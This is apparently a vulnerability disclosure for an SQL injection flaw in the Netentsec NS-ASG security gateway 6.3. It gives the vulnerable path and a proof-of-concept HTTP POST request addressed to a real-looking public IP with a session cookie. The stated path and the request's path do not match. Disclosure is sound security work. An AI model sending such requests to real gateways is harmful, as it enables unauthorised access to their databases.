Beijing Wangkang Technology Co., Ltd. is a leading provider of network application management equipment in China, focusing on the latest trend research and analysis in the field of network application management. It provides users with advanced network application management technology, products, and solutions, aiming to help users achieve the goal of "using the internet well" in network management.

There is an SQL injection vulnerability in the Netcom NS-ASG application security gateway. Attackers exploit vulnerabilities to cause harm to servers.

official： https://www.netentsec.com/

version:6.3

Vulnerability Path ：/protocol/log/listloginfo.php

<img width="519" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/471afe00-2e3f-4112-9e70-93c4c16f60f8">
<img width="516" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/47c8c3c9-bd6e-4b6a-8a89-3288636585de">


```
POST /protocol/index.php HTTP/1.1
Host: 1.85.53.53
Cookie: PHPSESSID=bfd2e9f9df564de5860117a93ecd82de
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

jsoncontent={"protocolType":"list_log_info","search":"1"}
```
<img width="520" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/e6f436eb-df7d-409d-bb5b-833014147e19">

